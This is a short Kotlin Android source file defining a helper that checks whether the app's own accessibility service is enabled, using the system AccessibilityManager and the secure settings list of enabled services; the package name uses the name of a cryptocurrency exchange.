package dApp.binance.Trading.arfu

import android.content.Context
import android.provider.Settings
import android.view.accessibility.AccessibilityManager

object AccessibilityServiceHelper {
    /**
     * Helper to check if the accessibility service is enabled
     */
    fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val accessibilityManager = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        if (!accessibilityManager.isEnabled) return false

        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        val serviceName = "${context.packageName}/${CarerAccessibilityService::class.java.name}"
        return enabledServices.contains(serviceName)
    }
}
